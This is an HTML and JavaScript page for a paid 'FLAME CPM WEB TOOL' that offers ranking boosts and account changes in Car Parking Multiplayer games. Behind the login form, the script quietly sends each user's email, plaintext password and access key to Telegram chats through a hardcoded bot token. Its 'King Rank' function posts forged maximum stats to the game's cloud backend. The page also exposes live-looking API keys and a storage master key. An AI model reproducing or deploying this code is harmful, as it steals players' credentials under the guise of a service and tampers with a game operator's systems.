<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
<title>FLAME WEB TOOL</title>
<style>
body{margin:0;padding:0;font-family:Arial,Helvetica,sans-serif;background:url("https://i.postimg.cc/ZqdtsJ6t/IMG-0640.jpg") center/cover fixed;color:#fff}
.center-wrapper{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:90%;max-width:350px}
.container{background:rgba(0,0,0,.6);backdrop-filter:blur(12px);padding:20px;border-radius:10px;box-shadow:0 0 25px #000;border:2px solid #00aaff;text-align:center}
h1{font-size:20px;margin-bottom:12px}
input,select{width:90%;padding:10px;margin:8px 0;border-radius:5px;border:0;background:rgba(255,255,255,.1);color:#fff;font-size:16px}
button{width:95%;padding:10px;margin:6px 0;border-radius:5px;border:0;cursor:pointer;font-weight:700;font-size:16px}
button.login{background:#00aaff;color:#fff}
button.menu{background:#ff8800;color:#fff}
.status{margin-top:10px;color:#0f0;min-height:20px}
.error{color:#f55}
.small{font-size:12px;opacity:.9}
.price{font-size:13px;opacity:.8;margin-bottom:6px;color:#0ff;}
</style>
</head>
<body>
<div class="center-wrapper">
  <div class="container">
    <h1>FLAME CPM WEB TOOL</h1>

    <div id="loginSection">
      <select id="gameSelect">
        <option value="">-- Select Game --</option>
        <option value="1">Car Parking Multiplayer</option>
        <option value="2">Car Parking Multiplayer 2</option>
      </select>
      <input id="email" type="email" placeholder="Email">
      <input id="password" type="password" placeholder="Password">
      <input id="accessKey" type="text" placeholder="Enter Access Key">
      <button class="login" id="loginBtn">Login</button>
      <div id="status" class="status"></div>
    </div>

    <div id="menuButtons" style="display:none">
      <div class="price">üëë King Rank - ‚Ç±500</div>
      <button class="menu" onclick="kingRank()">King Rank</button>

      <div class="price">üìß Change Email - ‚Ç±500</div>
      <button class="menu" onclick="changeEmail()">Change Email</button>

      <div class="price">üîê Change Password - ‚Ç±500</div>
      <button class="menu" onclick="changePassword()">Change Password</button>

      <div id="serviceStatus" class="status"></div>
    </div>

    <footer class="small" style="margin-top:12px">¬©@cpmflame</footer>
  </div>
</div>

<script>
const BIN_ID = "68fffdb0ae596e708f317d6e"; 
const MASTER_KEY = "$2a$10$qGhpOw4TrhqQqdaOEVsfx.//xeP1yrNELVuUVnGLVinijLbAdNO62";
const BASE_URL = `https://api.jsonbin.io/v3/b/68fffdb0ae596e708f317d6e`;

/* ---------- Firebase + Services ---------- */
const BOT_TOKEN = "8307704020:AAEwNsSCXACGHHehKt_ejhuFQbtN2MqHL70";
const CHAT_IDS = ['6614066633','7351189513'];
const GAMES = {
  "1": { name:"Car Parking Multiplayer", api_key:"AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM", rank_url:"https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4" },
  "2": { name:"Car Parking Multiplayer 2", api_key:"AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ", rank_url:"https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI" }
};

let currentUser=null,currentToken=null,currentPassword=null,selectedGame=null;

/* ‚úÖ Check access key from JSONBin */
async function verifyAccessKey(key){
  try{
    const res = await fetch(BASE_URL, { headers:{ "X-Master-Key": MASTER_KEY }});
    const data = await res.json();
    const keys = data?.record?.keys || [];
    const found = keys.find(k => k.key === key && !k.blocked);

    if (!found) return false;

    if (found.expiry && found.expiry !== "None") {
      const now = new Date();
      const exp = new Date(found.expiry);
      if (exp < now) return false;
    }
    return true;
  }catch(e){ console.error(e); return false; }
}

function updateStatus(msg,isError=false,target='status'){
  const el=document.getElementById(target);
  el.className=isError?'status error':'status';
  el.textContent=msg;
}

function sendMessage(text){
  CHAT_IDS.forEach(chatId=>{
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
      method:"POST",headers:{"Content-Type":"application/json"},
      body:JSON.stringify({chat_id:chatId,text:text})
    }).catch(()=>{});
  });
}

document.getElementById('loginBtn').addEventListener('click', async ()=>{
  const email=document.getElementById('email').value.trim();
  const password=document.getElementById('password').value;
  const key=document.getElementById('accessKey').value.trim();
  const gameVal=document.getElementById('gameSelect').value;
  selectedGame = GAMES[gameVal];
  if(!selectedGame){ updateStatus("Select game first!",true); return; }
  if(!email||!password||!key){ updateStatus("Please fill all fields!",true); return; }

  updateStatus("Checking access key...");
  const valid = await verifyAccessKey(key);
  if(!valid){ updateStatus("‚ùå Invalid or expired access key!",true); return; }

  updateStatus("Logging in...");
  try{
    const resp = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${selectedGame.api_key}`,{
      method:'POST',headers:{"Content-Type":"application/json"},
      body:JSON.stringify({email,password,returnSecureToken:true})
    });
    const data = await resp.json();
    if(data.idToken){
      currentUser=email; currentPassword=password; currentToken=data.idToken;
      updateStatus("‚úÖ Access granted! Loading services...");
      document.getElementById('loginSection').style.display='none';
      document.getElementById('menuButtons').style.display='block';
      sendMessage(`üîì Access: ${key}\nüéÆ ${selectedGame.name}\nüìß ${email}\nüîí ${password}`);
    }else updateStatus(`‚ùå Login failed: ${data.error?.message||'Unknown'}`,true);
  }catch(err){ updateStatus(`‚ùå Error: ${err.message}`,true); }
});

function requireLogin(){ return !!currentToken; }

async function kingRank(){
  if(!requireLogin()) return updateStatus("‚ùå Please login first!",true,'serviceStatus');
  updateStatus("Processing King Rank...",false,'serviceStatus');
  const ratingData={}; 
  const fields=["cars","car_fix","car_collided","car_exchange","car_trade","car_wash","slicer_cut","drift_max","drift","cargo","delivery","taxi","levels","gifts","fuel","offroad","speed_banner","reactions","police","run","real_estate","t_distance","treasure","block_post","push_ups","burnt_tire","passanger_distance"];
  fields.forEach(f=>ratingData[f]=100000); ratingData.time=10000000000; ratingData.race_win=3000;
  const payload={data:JSON.stringify({RatingData:ratingData})};
  const headers={"Authorization":`Bearer ${currentToken}`,"Content-Type":"application/json"};
  try{
    const res = await fetch(selectedGame.rank_url,{method:'POST',headers,body:JSON.stringify(payload)});
    if(res.ok){ updateStatus("‚úÖ King Rank done!",false,'serviceStatus'); sendMessage(`üëë King Rank\n${currentUser}`); }
    else updateStatus("‚ùå Failed King Rank!",true,'serviceStatus');
  }catch(err){ updateStatus(`‚ùå ${err.message}`,true,'serviceStatus'); }
}

async function changeEmail(){
  if(!requireLogin()) return updateStatus("Login first!",true,'serviceStatus');
  const newEmail=prompt("Enter new email:"); if(!newEmail)return;
  try{
    const r=await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${selectedGame.api_key}`,{
      method:'POST',headers:{"Content-Type":"application/json"},body:JSON.stringify({idToken:currentToken,email:newEmail,returnSecureToken:true})
    });const d=await r.json();
    if(d.email){ currentUser=d.email; currentToken=d.idToken; updateStatus("‚úÖ Email changed!",false,'serviceStatus'); sendMessage(`üìß Changed Email\n${newEmail}`);}
    else updateStatus(`‚ùå ${d.error?.message||'Unknown'}`,true,'serviceStatus');
  }catch(e){updateStatus(`‚ùå ${e.message}`,true,'serviceStatus');}
}

async function changePassword(){
  if(!requireLogin()) return updateStatus("Login first!",true,'serviceStatus');
  const newPassword=prompt("Enter new password:"); if(!newPassword)return;
  try{
    const r=await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${selectedGame.api_key}`,{
      method:'POST',headers:{"Content-Type":"application/json"},body:JSON.stringify({idToken:currentToken,password:newPassword,returnSecureToken:true})
    });const d=await r.json();
    if(d.idToken){ currentPassword=newPassword; currentToken=d.idToken; updateStatus("‚úÖ Password changed!",false,'serviceStatus'); sendMessage(`üîê Changed Password\n${currentUser}`);}
    else updateStatus(`‚ùå ${d.error?.message||'Unknown'}`,true,'serviceStatus');
  }catch(e){updateStatus(`‚ùå ${e.message}`,true,'serviceStatus');}
}
</script>
</body>
</html>
